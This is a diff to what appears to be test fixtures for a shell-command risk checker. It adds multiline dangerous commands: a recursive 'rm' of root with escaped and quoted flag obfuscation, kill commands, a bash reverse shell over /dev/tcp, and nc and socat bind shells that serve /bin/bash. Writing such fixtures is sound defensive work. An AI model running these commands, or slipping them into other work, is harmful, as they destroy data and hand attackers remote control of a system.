@@ -21,8 +21,7 @@ kill -9 123
 kill -n 9 123
 kill -s TERM 123
 reboot
-sysctl -p
-'''
+sysctl -p'''
 
 script_shell_multiline = r'''ls -al;
 rm \
@@ -39,6 +38,19 @@ rm \
 rm "\
 -rf \" \
 /"
+rm \
+-r -f \
+/;ls -al
+rm \
+'--f'o"r"ce \
+-r \
+/tmp/*
+kill -9 123456
+kill -s TERM 123456
+kill -n 9 123456
+bash -i > /dev/tcp/***REMOVED***/5566
+nc -lvvp 1988 -e /bin/bash
+socat -lvvp 1988 -e /bin/bash 
 echo Done
 '''
 
@@ -514,4 +526,3 @@ nocmdb_boxes = [
         'subject_id': 1
     },
 ]
-
